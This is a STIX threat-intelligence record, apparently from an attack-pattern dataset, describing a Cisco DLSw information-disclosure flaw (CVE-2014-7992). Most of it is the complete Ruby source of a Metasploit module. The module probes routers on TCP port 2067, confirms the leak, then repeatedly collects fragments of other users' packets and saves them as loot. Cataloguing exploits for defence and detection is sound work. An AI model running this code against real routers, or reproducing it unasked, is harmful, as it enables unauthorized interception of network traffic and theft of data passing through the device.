{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2ba073dd-5a94-4ce5-a4d7-6f210c14dd7d",
    "created": "2024-08-14T16:26:36.4824Z",
    "modified": "2024-08-14T16:26:36.482403Z",
    "name": "Cisco DLSw Information Disclosure Scanner",
    "description": "( This module implements the DLSw information disclosure retrieval. There is a bug in Cisco's DLSw implementation affecting 12.x and 15.x trains that allows an unauthenticated remote attacker to retrieve the partial contents of packets traversing a Cisco router with DLSw configured and active. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/dlsw/dlsw_leak_capture.rb",
            "external_id": "dlsw_leak_capture.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-7992"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/tt5555/dlsw_exploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'socket'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'           => 'Cisco DLSw Information Disclosure Scanner',\n      'Description'    => %q(\n        This module implements the DLSw information disclosure retrieval. There\n        is a bug in Cisco's DLSw implementation affecting 12.x and 15.x trains\n        that allows an unauthenticated remote attacker to retrieve the partial\n        contents of packets traversing a Cisco router with DLSw configured\n        and active.\n      ),\n      'Author'         => [\n        'Tate Hansen', # Vulnerability discovery\n        'John McLeod', # Vulnerability discovery\n        'Kyle Rainey' # Built lab to recreate vulnerability and help test\n      ],\n      'References'     =>\n        [\n          ['CVE', '2014-7992'],\n          ['URL', 'https://github.com/tt5555/dlsw_exploit']\n        ],\n      'DisclosureDate' => 'Nov 17 2014',\n      'License'        => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(2067),\n        OptInt.new('LEAK_AMOUNT', [true, 'The number of bytes to store before shutting down.', 1024])\n      ])\n  end\n\n  def get_response(size = 72)\n    connect\n    response = sock.get_once(size)\n    disconnect\n    response\n  end\n\n  # Called when using check\n  def check_host(_ip)\n    print_status(\"Checking for DLSw information disclosure (CVE-2014-7992)\")\n    response = get_response\n\n    if response.blank?\n      vprint_status(\"No response\")\n      Exploit::CheckCode::Safe\n    elsif response[0..1] == \"\\x31\\x48\" || response[0..1] == \"\\x32\\x48\"\n      vprint_good(\"Detected DLSw protocol\")\n      report_service(\n        host: rhost,\n        port: rport,\n        proto: 'tcp',\n        name: 'dlsw'\n      )\n      # TODO: check that response has something that truly indicates it is vulnerable\n      # and not simply that it responded\n      unless response[18..72].scan(/\\x00/).length == 54\n        print_good(\"Vulnerable to DLSw information disclosure; leaked #{response.length} bytes\")\n        report_vuln(\n          host: rhost,\n          port: rport,\n          name: name,\n          refs: references,\n          info: \"Module #{fullname} collected #{response.length} bytes\"\n        )\n        Exploit::CheckCode::Vulnerable\n      end\n    else\n      vprint_status(\"#{response.size}-byte response didn't contain any leaked data\")\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  # Main method\n  def run_host(ip)\n    return unless check_host(ip) == Exploit::CheckCode::Vulnerable\n\n    dlsw_data = ''\n    until dlsw_data.length > datastore['LEAK_AMOUNT']\n      response = get_response\n      dlsw_data << response[18..72] unless response.blank?\n    end\n    loot_and_report(dlsw_data)\n  end\n\n  def loot_and_report(dlsw_leak)\n    path = store_loot(\n      'dlsw.packet.contents',\n      'application/octet-stream',\n      rhost,\n      dlsw_leak,\n      'DLSw_leaked_data',\n      'DLSw packet memory leak'\n    )\n    print_status(\"DLSw leaked data stored in #{path}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "Nov 17 2014"
}